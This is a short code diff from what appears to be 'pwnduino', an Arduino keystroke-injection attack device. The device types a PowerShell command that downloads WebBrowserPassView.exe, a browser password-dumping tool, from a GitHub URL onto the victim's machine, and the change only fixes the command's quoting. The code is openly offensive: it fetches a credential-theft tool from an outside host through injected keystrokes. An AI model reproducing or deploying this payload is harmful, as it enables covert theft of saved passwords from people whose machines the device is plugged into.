@@ -110,7 +110,7 @@ void setup()
    delay(500);*/
 
    // Run powershell command
-   keyString("powershell -command (New-Object System.Net.WebClient).DownloadFile('https://github.com/ex0dus-0x/pwnduino/blob/master/deps/WebBrowserPassView.exe', 'WebBrowserPassView.exe')");
+   keyString("powershell -command \"(New-Object System.Net.WebClient).DownloadFile('https://github.com/ex0dus-0x/pwnduino/blob/master/deps/WebBrowserPassView.exe', 'WebBrowserPassView.exe')\"");
    keyPress(0, KEY_ENTER);
    keyRelease();
    delay(500);
